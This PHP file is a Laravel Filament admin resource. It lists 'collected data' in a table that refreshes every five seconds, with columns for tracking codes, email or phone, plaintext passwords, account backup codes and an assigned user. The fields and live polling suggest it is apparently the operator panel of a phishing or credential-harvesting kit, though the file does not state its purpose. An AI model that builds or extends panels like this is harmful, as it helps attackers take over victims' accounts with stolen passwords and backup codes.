<?php

namespace App\Filament\Resources;

use App\Filament\Resources\CollectedDataResource\Pages;
use App\Filament\Resources\CollectedDataResource\RelationManagers;
use App\Filament\Resources\CollectedDataResource\Widgets\ColledtedDataWidget;
use App\Models\CollectedData;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class CollectedDataResource extends Resource
{
    protected static ?string $model = CollectedData::class;

    protected static ?string $navigationIcon = 'heroicon-o-document-chart-bar';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([
                //
            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->poll('5s')
            ->emptyStateHeading('No Collected Data')
            ->emptyStateDescription('Once Data Are Added You Will See Them Here.')
            ->columns([
                Tables\Columns\TextColumn::make('tracking_code')
                    ->searchable()
                    ->sortable(),
                Tables\Columns\TextColumn::make('email_and_phone')
                    ->searchable()
                    ->label('Email | Password')
                    ->sortable(),
                Tables\Columns\TextColumn::make('password')
                    ->searchable()
                    ->sortable(),
                Tables\Columns\TextColumn::make('backup_code')
                    ->searchable()
                    ->sortable(),
                Tables\Columns\TextColumn::make('user_id')
                    ->getStateUsing(function ($record) {
                        return $record->user->name;
                    })
                    ->searchable()
                    ->sortable(),
            ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\EditAction::make(),
                Tables\Actions\DeleteAction::make()
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            //
        ];
    }

    public static function getWidgets(): array
    {
        return [
            ColledtedDataWidget::class
        ];
    }


    public static function getPages(): array
    {
        return [
            'index' => Pages\ListCollectedData::route('/'),
            'create' => Pages\CreateCollectedData::route('/create'),
            'edit' => Pages\EditCollectedData::route('/{record}/edit'),
        ];
    }
}
